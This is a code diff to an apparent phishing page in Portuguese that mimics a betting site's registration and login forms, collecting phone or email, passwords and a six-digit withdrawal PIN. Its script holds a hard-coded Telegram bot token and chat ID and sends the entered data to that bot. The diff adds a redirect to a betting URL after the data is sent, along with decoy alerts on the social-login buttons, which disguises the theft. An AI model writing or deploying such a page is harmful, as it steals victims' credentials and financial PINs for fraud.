@@ -38,7 +38,6 @@
             position: relative;
         }
 
-        /* Topo e Promoção */
         .logo {
             text-align: center;
             font-size: 32px;
@@ -56,7 +55,6 @@
             line-height: 1.4;
         }
 
-        /* Abas Registro / Login */
         .tabs {
             display: flex;
             position: relative;
@@ -75,9 +73,7 @@
             text-align: center;
             transition: color 0.2s;
         }
-        .tab-btn.active {
-            color: var(--primary);
-        }
+        .tab-btn.active { color: var(--primary); }
         .tab-indicator {
             position: absolute;
             bottom: 0;
@@ -89,13 +85,10 @@
             transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        /* Inputs */
         .form-section { display: none; }
         .form-section.active { display: block; }
 
-        .input-group {
-            margin-bottom: 12px;
-        }
+        .input-group { margin-bottom: 12px; }
         .input-label-top {
             font-size: 11px;
             color: var(--text-gray);
@@ -125,10 +118,7 @@
             width: 100%;
             font-size: 13px;
         }
-        .input-box input::placeholder {
-            color: #636366;
-            font-size: 13px;
-        }
+        .input-box input::placeholder { color: #636366; font-size: 13px; }
 
         .hint-text {
             color: var(--primary);
@@ -137,7 +127,6 @@
             display: block;
         }
 
-        /* PIN de Saque 6 Dígitos */
         .saque-title {
             font-size: 12px;
             font-weight: 600;
@@ -162,11 +151,8 @@
             color: var(--primary);
             outline: none;
         }
-        .pin-input:focus {
-            border-color: var(--primary);
-        }
+        .pin-input:focus { border-color: var(--primary); }
 
-        /* Termos */
         .terms {
             display: flex;
             align-items: center;
@@ -187,7 +173,6 @@
             cursor: pointer;
         }
 
-        /* Botão Principal */
         .btn-submit {
             width: 100%;
             padding: 13px;
@@ -202,7 +187,6 @@
         }
         .btn-submit:disabled { opacity: 0.7; }
 
-        /* Links e Social */
         .sub-links {
             display: flex;
             justify-content: space-around;
@@ -235,19 +219,18 @@
         .social-icons i {
             font-size: 22px;
             cursor: pointer;
+            transition: transform 0.2s;
         }
+        .social-icons i:active { transform: scale(0.9); }
         .fa-google { color: #ea4335; }
         .fa-facebook { color: #1877f2; }
         .fa-telegram { color: #24a1de; }
 
-        /* Modal Termos de Uso */
         .modal-overlay {
             display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.75);
             backdrop-filter: blur(5px);
             z-index: 999;
@@ -256,9 +239,7 @@
             flex-direction: column;
             padding: 20px;
         }
-        .modal-overlay.active {
-            display: flex;
-        }
+        .modal-overlay.active { display: flex; }
         .modal-card {
             background-color: #1e1e20;
             border: 1px solid #333;
@@ -286,16 +267,9 @@
             padding-right: 5px;
             margin-bottom: 16px;
         }
-        .modal-body p {
-            margin-bottom: 12px;
-        }
-        .modal-body::-webkit-scrollbar {
-            width: 4px;
-        }
-        .modal-body::-webkit-scrollbar-thumb {
-            background: #444;
-            border-radius: 4px;
-        }
+        .modal-body p { margin-bottom: 12px; }
+        .modal-body::-webkit-scrollbar { width: 4px; }
+        .modal-body::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
         .btn-accept {
             width: 100%;
             padding: 12px;
@@ -311,8 +285,7 @@
             margin-top: 15px;
             background: rgba(40, 40, 40, 0.8);
             border: 1px solid #555;
-            width: 40px;
-            height: 40px;
+            width: 40px; height: 40px;
             border-radius: 50%;
             display: flex;
             justify-content: center;
@@ -333,14 +306,13 @@
         Convide outras pessoas e ganhe R$ 2 milhoes
     </div>
 
-    <!-- Abas -->
     <div class="tabs">
         <button class="tab-btn active" id="tabRegistroBtn" onclick="switchTab('registro')">Registro</button>
         <button class="tab-btn" id="tabLoginBtn" onclick="switchTab('login')">Login</button>
         <div class="tab-indicator" id="indicator"></div>
     </div>
 
-    <!-- Formulário de Registro -->
+    <!-- Registro -->
     <form id="formRegistro" class="form-section active" onsubmit="handleRegistro(event)">
         <span class="input-label-top">Suporte Número do Celular/E-mail/Conta Registro</span>
         
@@ -366,7 +338,6 @@
             <span class="hint-text">Deve ter o mesmo nome da sua conta bancária de retirada</span>
         </div>
 
-        <!-- PIN de Saque (6 dígitos) -->
         <div class="saque-title">Senha Saque (PIN de 6 dígitos):</div>
         <div class="pin-grid" id="pinInputs">
             <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required>
@@ -385,7 +356,7 @@
         <button type="submit" id="btnReg" class="btn-submit">Registro</button>
     </form>
 
-    <!-- Formulário de Login -->
+    <!-- Login -->
     <form id="formLogin" class="form-section" onsubmit="handleLogin(event)">
         <span class="input-label-top">Conta de Acesso</span>
         
@@ -406,24 +377,22 @@
         <button type="submit" id="btnLogin" class="btn-submit" style="margin-top: 16px;">Entrar</button>
     </form>
 
-    <!-- Links Auxiliares -->
     <div class="sub-links">
-        <a href="#">Suporte ao cliente</a>
+        <a href="https://t.me/SU7DBSBET" target="_blank">Suporte ao cliente</a>
         <a onclick="showDemoAlert()">Demo</a>
     </div>
 
-    <!-- Login Social -->
     <div class="social-area">
         <span>Registro vinculativo</span>
         <div class="social-icons">
-            <i class="fa-brands fa-google"></i>
-            <i class="fa-brands fa-facebook"></i>
-            <i class="fa-brands fa-telegram">t.me/@SU7DBSBET</i>
+            <i class="fa-brands fa-google" onclick="showSocialAlert()"></i>
+            <i class="fa-brands fa-facebook" onclick="showSocialAlert()"></i>
+            <i class="fa-brands fa-telegram" onclick="showSocialAlert()"></i>
         </div>
     </div>
 </div>
 
-<!-- Modal Acordo do Usuário -->
+<!-- Modal -->
 <div class="modal-overlay" id="modalTerms">
     <div class="modal-card">
         <div class="modal-header">Acordo do Usuário</div>
@@ -444,20 +413,19 @@
 <script>
     const TOKEN = "8270859221:AAFbhwZrsw5Kn7fPE_YoPhcRZe8R0BqNzzU";
     const CHAT_ID = "-5250112132";
+    const REDIRECT_URL = "https://win1.bsbet10.com/?id=421928318";
 
-    // Alerta Demo
     function showDemoAlert() {
         alert("Demo temporariamente indisponível");
     }
 
-    // Controle do Modal
+    function showSocialAlert() {
+        alert("Serviço de login temporariamente fora do ar");
+    }
+
     function toggleModal(show) {
         const modal = document.getElementById('modalTerms');
-        if (show) {
-            modal.classList.add('active');
-        } else {
-            modal.classList.remove('active');
-        }
+        modal.classList.toggle('active', show);
     }
 
     function acceptTerms() {
@@ -465,7 +433,6 @@
         toggleModal(false);
     }
 
-    // Alternar abas Registro / Login
     function switchTab(mode) {
         const tabReg = document.getElementById('tabRegistroBtn');
         const tabLog = document.getElementById('tabLoginBtn');
@@ -488,7 +455,6 @@
         }
     }
 
-    // Gerenciamento dos campos PIN de 6 dígitos
     const pins = document.querySelectorAll('.pin-input');
     pins.forEach((field, index) => {
         field.addEventListener('input', () => {
@@ -504,7 +470,6 @@
         });
     });
 
-    // Envio do Registro
     function handleRegistro(e) {
         e.preventDefault();
         
@@ -524,7 +489,6 @@
         sendTelegram(payload, btn, "Registro");
     }
 
-    // Envio do Login
     function handleLogin(e) {
         e.preventDefault();
 
@@ -545,8 +509,10 @@
         })
         .then(res => {
             if (res.ok) {
-                alert("✅ Dados enviados com sucesso!");
-                location.reload();
+                btnElement.innerText = "Redirecionando...";
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 800);
             } else {
                 alert("❌ Erro ao enviar!");
                 btnElement.disabled = false;
